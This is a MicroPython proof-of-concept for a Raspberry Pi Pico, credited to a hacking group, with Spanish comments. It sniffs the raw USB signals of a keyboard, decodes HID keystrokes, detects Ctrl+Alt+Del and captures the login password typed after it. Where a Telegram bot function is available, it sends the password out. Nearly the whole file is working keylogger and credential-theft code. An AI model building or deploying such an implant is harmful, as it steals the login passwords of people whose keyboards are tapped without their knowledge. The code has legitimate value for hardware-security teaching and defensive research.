# POC Sniffa protocolo USB-teclado y captura contraseña de inicio sesion
# POC Como:  Detecta Ctrl+alt+Supr y captura lo que se ecribe despues
#
# CC Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
# https://creativecommons.org/licenses/by-sa/4.0/
# https://euskalhack.org/
#
from machine import Pin
import rp2
from _thread import start_new_thread 

@rp2.asm_pio( autopush=True,
              push_thresh=32,
              in_shiftdir=rp2.PIO.SHIFT_LEFT,
              out_shiftdir=rp2.PIO.SHIFT_RIGHT,
              fifo_join=rp2.PIO.JOIN_RX,           
            )
# Repaso/chuleta señales USB a nivel fisico y distintos estados de las lineas usb
#
# D+  _._._._/"\_/"\_/"\_/"'"  XXXXX   _/"   _._   "\_   "\_      x_._._._         ______
# D-  "'"'"'"\_/"\_/"\_/"\_._  XXXXX   "\_   "\_   _/"   _._      x_._/"'"         "\__/"
#           j-k-j-k-j-k-j-k=k  Datos   j-k   j-0   k-j   k-0       0 0 j
#            0 0 0 0 0 0 0 1                                  EOP(End Of Packet)    KA
#            SYNC(00000001)

# programa en ensamblador eState Machine que captura los datos de las lineas USB modo RAW !!!Solo 15Instrucciones!!!
def prog_pio_usb_rx_raw(): #SM que recibe usb(phy) modo raw(1=j 0=k) (nota:hay que invertir bits ^0xFFFFFFFF)

    set(pindirs, 0b00)			# Por si acaso pongo pins en modo entrada. (¿¿¿Se podria emular colector abierto???)
    wrap_target()				    # wrap y wrap_target se usan para ahorrarnos el jmp del bucle infinito 
    label("init")
    #nop()#[3]					    # Depuracion: !!!!al poner el nop se arregla el problema de que desde sm.exec no funcione!!!!
    wait(1, pin, 0)			[2] # [3]# Wait for start bit (D+ 0=>1)SOP (luego espera 3 ciclos(mitad del bit))
    wait(0, pin, 1)				  # mas estabilidad con teclados "malos" ????
   
    label("bitloop")			  # 
    mov(osr, pins)				  # workarround para cargar solo 2 bits en registro y (d+ y d-) 1/2
    out(y, 2)					      # workarround para cargar solo 2 bits en registro y (d+ y d-) 2/2
    jmp(not_y, "usb_SEO_ka_rst")# detecto 00 (SEO) !!FALLA con mov(y,pins) si hay otros pins a 1 por eso el workarround
    in_(y, 1)					      # !!!autopush!!!! Lee dato del pin0 (D+) (por eso sale invertido)   
    jmp("bitloop")			[3] # Total [8 ciclos 1+3+1+1+1+1][4] cambiando el retardo veras mas o menos 1 y 0 seguidos
    
    label("usb_SEO_ka_rst")	# como tengo auto push. Si data<32bits vere 2push? 1con FF.Me viene bien para detectar el EOP y separar paquetes.
    push(block)					    # si se salta aqui porque hay un SEO hay que poner push Para enviar los datos restantes 
    irq(0)						      # Activo interrupcion para procesar los datos recibidos
    wrap()						      # wrap y wrap_target se usan para ahorrarnos el jmp del bucle infinito

    
# Defino constantes tipicas usb HID
# Recuerda sm usb(phy) modo raw(1=j 0=k)
KA            = const(0xFFFF) #Keep Alive
SYNC_PIDACK   = const(0x54D8) # SYNC+ACK 54=SYNC(01010100) D8=PID:ACK
SYNC_PIDNAK   = const(0x54C6) # C6=PID:NACK
SYNC_PIDSETUP = const(0x5472)
SYNC_PIDIN    = const(0x544E) #4E=PID:IN
SYNC_PIDOUT   = const(0x5450) #54 SYNC 50=PID:OUT
ADR0_EP0_CRC5 = const(0xAAA5) #AAA5=( Adr0 EP0 CRC5=02 )
SYNC_PIDDATA0 = const(0x5428)
SYNC_PIDDATA1 = const(0x5436)


@micropython.viper
def usb_rx(): # debug muestra datos buffer usb de la sm
    while sm2.rx_fifo(): print("Recibo   ",hex(sm2.get()^0xFFFFFFFF))

#variables globales para captura password
debug=0                # modo debug muestra mas informacion por el serie para poder depurar.
ctrl_alt_supr=0        # esta variable se pone a 1 cuando se ha detectado la secuencia Ctrl+Alt+Supr
password=""            # en esta variable se almacenara el password capturado 

# Funcion que sniffa protocolo usb a la espera de que se introduzca una contraseña
@micropython.native
def usb_kbd_sniff_passwod(mod:int,key1:int):
    # Buscar USB HID Keyboard scan codes o https://usb.org/sites/default/files/hut1_3_0.pdf #pagina 89
    # Recuerda en el Byte 0 estan los Keyboard modifier bits (SHIFT, ALT, CTRL etc)
    HID_MODIFIER_LEFT_CTRL = const(0b01)
    HID_MODIFIER_LEFT_ALT  = const(0b100)
    HID_CTRL_ALT           = const(0b101)
    HID_CTRL_SHIFT         = const(0b11)
    HID_SHIFT_LR           = const(0b100010)#las dos mayusculas depuracion
    #Byte 1: reserved 
    #Byte 2-7: Up to six keyboard usage indexes representing the keys "pressed".
    KEY_KP_DOT  = const(0x63) # Keypad . and Delete
    KEY_DELETE  = const(0x4c) # Keyboard Delete Forward
    KEY_ENTER   = const(0x28) # Keyboard Return (ENTER)
    KEY_KPENTER = const(0x58) # Keypad ENTER
    KEY_ESC     = const(0x29) # Keyboard ESCAPE
    global ctrl_alt_supr
    global password
    keya='' #convierto la tecla en ascii
    if   key1>=0x04 and key1<=0x1d: keya=chr(key1+93)#93=97-4  ascii('a')-0x04
    elif key1>=0x1e and key1<=0x26: keya=chr(key1+19)#19=49-30 ascii('1')-0x1e
    elif key1==0x27:keya='0'
    
    if mod or key1:
        if debug: print('',keya)
        if mod==HID_CTRL_SHIFT and key1==KEY_DELETE: ctrl_alt_supr=1 #debug
        if mod==HID_CTRL_ALT and (key1==KEY_KP_DOT or key1==KEY_DELETE):
            ctrl_alt_supr=1
            password=""
        if ctrl_alt_supr and keya:
            password+=keya
        if ctrl_alt_supr and (key1==KEY_ENTER or key1==KEY_KPENTER or key1==KEY_ESC):
            ctrl_alt_supr=0
            #si estoy en una piw y tengo la funcion telegram => envio password
            if "telegram_bot_send_txt" in globals():   
                telegram_bot_send_txt("password: "+password)
            print("password capturado:",password)
    #debug/comprovacion si pulsas mayus compruebo variables
    if debug and mod==HID_SHIFT_LR:print(ctrl_alt_supr,"password:",password)#
#fin usb_kbd_sniff_passwod


#https://docs.micropython.org/en/v1.12/reference/isr_rules.html#writing-interrupt-handlers
@micropython.native
def usb_rx_int():
    
    @micropython.native
    def usb_rx_kbd():
        #https://docs.micropython.org/en/latest/genrst/builtin_types.html#bytearray
        hid_dat=bytearray(8)
        pid_ant=0#no sirve entre ejecuciones ¿¿global??
        while sm2.rx_fifo():
            r=sm2.get()^0xFFFFFFFF
            pid=r>>16
            d0=r>>8&0xFF #sk teclas especiales ctrl,shift,alt,gui
            d1=r&0xFF    # en teclados d1 deberia ser 0 : (si d1=0xAA o d1=0x55 es una tecla????)
            
            if pid==SYNC_PIDIN: pid_ant=pid 
            elif pid_ant and (pid==SYNC_PIDDATA0 or pid==SYNC_PIDDATA1):
                if sm2.rx_fifo(): r1=sm2.get()^0xFFFFFFFF
                if sm2.rx_fifo(): sm2.get() #ultimo paq 2bytes + crc no interesa
                if d1==0xAA or d1==0x55:#recuerda #hex(int(invert_nrzi(bstr(0xaaaa))))
                    #print(hex(r&0xFFFF),hex(r1)) #RAW
                    #print(hex(d0),hex(r1>>24),end=" ")#teclas sin decodificar (TABLA?)
                    keys=lsbf(int(invert_nrzi(bstr(d0<<8|(r1>>24),16)),2),16)#invierto nrzi y lsbf (decod_usb_raw16(d)
                    mod=keys&0xFF
                    key1=keys>>8
                    if debug and (mod or key1): print(bin(mod),hex(key1),end="")#,keya)#if:si imprimo menos asi saturo menos el serie
                    if mod or key1: usb_kbd_sniff_passwod(mod,key1)
                    #if mod==0b10: print("-",ctrl_alt_supr)#¿¿OJO se cae al acceder a una variable global???

            elif r==0xffff54d8: pass#ack
            elif r==0xffff54c6: pass#nak")
            elif r==0x5472aaa5: pass#PID:SETUP0
            elif r==0x544eaaa5: pass#PID:IN0
            elif r==0x5450aaa5: pass#PID:OUT0

    rp2.PIO(0).irq(lambda pio: usb_rx_kbd())#interrupciones en maquina PIO(0) recuerda hay 2 pio con 4 sm cada una
#fin usb_rx_int():

# pasa un numero a binario (salida modo cadena texto)
@micropython.native
def bstr(num, long:int=8):#pasa un numero a string binario
    bstr=bin(num)[2:]
    zl=long-len(bstr)
    zl='0'*zl
    return zl+bstr

@micropython.native
def lsbf(num, count:int=8) ->int:#lsbf=Least Singnificant Bit First
    out = list(count * '0')
    for i in range(0, count):
        if num >> i & 1:
            out[i] = '1'
    return int(''.join(out), 2) #return out???
#ej:bin(lsbf(0b1000000010000000,16))#16 es el numero de bits

# Invierte codificacion nrzi le pasas un dato en bruto(phy) y te saca el dato sin codifcar
@micropython.native
def invert_nrzi(bitstr,est_ant='0'):#saco dato de nrzi
    nrzi="0b"                       # Recuerda sm usb(phy) modo raw(1=j 0=k)
    for bit in bitstr:
        if bit==est_ant:# lineas: mismo estado     => 1
            nrzi+='1'            
        else:           # lineas: cambio de estado => 0
            nrzi+='0'
            if est_ant=='1':est_ant='0'
            else:est_ant='1'
            #TODO calculo bitstuff y a la 6 ignoro cambio???           
    return nrzi
#ej: hex(int(invert_nrzi("010101")))
#ej  hex(lsbf(int(invert_nrzi(bstr(0xAAAA,16),'0'),2),16))#0x00 #16 es el numero de bits 2 es de base2 '0' es est ant
#ej  hex(lsbf(int(invert_nrzi(bstr(0x5555,16),'1'),2),16))#0x00 #0x1 si est_ant es '0'  

def decod_usb_raw16(d,estant='0'):
    return lsbf(int(invert_nrzi(bstr(d,16),'0'),2),16)

#Depuracion muestro estado de patillas
def est_lin():
    print("Estado Lineas: ")
    print("\t D+", Pin(16).value(), Pin(16))
    print("\t D-", Pin(17).value(), Pin(17) )
    print("\t irq flags", hex(rp2.PIO(0).irq().flags()), hex(sm2.irq().flags()), "rx_fifo", sm2.rx_fifo())#,sm1.irq().flags())

print("Instancio Maquinas de estado PIO/sm")
print("sm2 usb_rx")
pn=16
sm2 = rp2.StateMachine(1,prog_pio_usb_rx_raw,freq=12000000,in_base=Pin(pn),jmp_pin=Pin(pn))
sm2.active(1)        # nota: si arranco la maquina despues de transmitir es posible que pierda caracteres.
est_lin()            # debug muestro estado patillas antes inicializarlas

Pin(16, mode=Pin.IN, pull=Pin.PULL_DOWN)#Pin(16,mode=Pin.OPEN_DRAIN,pull=Pin.PULL_DOWN)#TODO pruebas colector abierto 
Pin(17, mode=Pin.IN, pull=Pin.PULL_DOWN)

#Representa por la consola los paquetes usb recibidos
usb_rx_int() # interrupcion al recibir datos desde la sm (1er nucleo)
#start_new_thread(usb_rx_int,()) #opcion interrupcion en 2ºnucleo. (hilo) nota: la interfaz de thonny se cuelga mas.

est_lin()#debug muestro estado patillas despues de inicializarlas
print("nota: es posible que la REPL de Thonny se bloquee\nsi envias muchos datos serie desde el segundo nucleo")
print("en este caso hay que reiniciar la rpi si falla el repl")
print("si pones debug=1 al interceptar teclas aparecera:\nmod y Scan code")
print("debug/test Pulsa Ctrl+shift+supr , un password e intro para probar")
